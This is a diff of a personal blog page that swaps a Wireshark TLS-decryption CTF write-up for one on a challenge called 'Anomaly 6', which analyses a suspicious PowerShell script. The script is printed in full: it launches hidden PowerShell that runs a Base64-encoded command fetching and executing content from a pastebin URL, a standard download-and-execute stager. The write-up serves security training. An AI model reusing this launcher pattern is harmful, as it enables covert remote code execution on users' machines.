@@ -11,7 +11,7 @@
 
     <title>
         
-          WebNet0 - CMouse&#39;s Blog
+          Anomaly 6 - CMouse&#39;s Blog
         
     </title>
 
@@ -138,16 +138,14 @@ show_sidebar()
 </div>
 
 <div class="book-post">
-  <h1 id="WebNet0"><a href="#WebNet0" class="headerlink" title="WebNet0"></a>WebNet0</h1><p>Category: Forensics<br>Points: 350 pts</p>
-<p>We found this <a href="https://2019shell1.picoctf.com/static/470e17b168561f9eabdfa95e412dbe10/capture.pcap" target="_blank" rel="noopener">packet capture</a> and <a href="https://2019shell1.picoctf.com/static/470e17b168561f9eabdfa95e412dbe10/picopico.key" target="_blank" rel="noopener">key</a>. Recover the flag. You can also find the file in /problems/webnet0_0_363c0e92cf19b68e5b5c14efb37ed786.</p>
+  <h1 id="Anomaly-6"><a href="#Anomaly-6" class="headerlink" title="Anomaly 6"></a>Anomaly 6</h1><p>Points: 78</p>
+<p>An automated alert notified your security team to a potentially malicious script being executed on a users machine. Your job is to analyze the script to determine what it is doing. Note: During your analysis, the script should lead you to a sentence in English; this will be the answer you submit.</p>
 <hr>
-<p>The packet capture looks like this:</p>
-<p><img src="/images/picoctf/webnet0-1.jpeg" alt="webnet0-1"></p>
-<p>As we can see, the TLS protocol is used, so the communication is encrypted.</p>
-<p>However, we are given the key. <strong>Wireshark Version 3</strong> allows you to apply a key to the packet capture, so the communication will be decoded automatically! For Mac users, the way is Wireshark -&gt; Preferences -&gt; RSA Keys -&gt; Add new keyfile. You can then add the downloaded keyfile.</p>
-<p><img src="/images/picoctf/webnet0-2.jpeg" alt="webnet0-2"></p>
-<p>Then, return to the packet capture and right-click on an encoded packet. Select “Decode As…” and select the key you’ve just added. You can then see the decoded communication! The flag is right here:</p>
-<p><img src="/images/picoctf/webnet0-3.jpeg" alt="webnet0-3"></p>
+<p>The provided file is a PowerShell script:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe  <span class="keyword">if</span>([IntPtr]::Size <span class="nomarkup">-eq</span> <span class="number">4</span>)&#123;<span class="variable">$b</span>=<span class="string">'powershell.exe'</span>&#125;<span class="keyword">else</span>&#123;<span class="variable">$b</span>=<span class="variable">$env:windir</span>+<span class="string">'\syswow64\WindowsPowerShell\v1.0\powershell.exe'</span>&#125;;</span><br><span class="line"><span class="variable">$s</span>=<span class="built_in">New-Object</span> System.Diagnostics.ProcessStartInfo;</span><br><span class="line"><span class="variable">$s</span>.FileName=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$s</span>.Arguments=<span class="string">'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('</span><span class="string">'KEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9RWlhkVWVFYiIpLkNvbnRlbnQ='</span><span class="string">')))'</span>;</span><br><span class="line"><span class="variable">$s</span>.UseShellExecute=<span class="literal">$false</span>;</span><br><span class="line"><span class="variable">$s</span>.RedirectStandardOutput=<span class="literal">$true</span>;</span><br><span class="line"><span class="variable">$s</span>.WindowStyle=<span class="string">'Hidden'</span>;</span><br><span class="line"><span class="variable">$s</span>.CreateNoWindow=<span class="literal">$true</span>;</span><br><span class="line"><span class="variable">$p</span>=[System.Diagnostics.Process]::Start(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure>
+<p>You don’t really have to know the syntax to solve this problem. The Base64 string on line 4 looks fishy - let’s decode it.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ base64 -D</span><br><span class="line">KEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9RWlhkVWVFYiIpLkNvbnRlbnQ=</span><br><span class="line">(Invoke-WebRequest -Uri <span class="string">"https://pastebin.com/raw/QZXdUeEb"</span>).Content</span><br></pre></td></tr></table></figure>
+<p>Let’s go to the URL “<a href="https://pastebin.com/raw/QZXdUeEb&quot;" target="_blank" rel="noopener">https://pastebin.com/raw/QZXdUeEb&quot;</a>. We will then see the answer “buzzin radars is buzzin yah yah yah yah”.</p>
 
 </div>
 
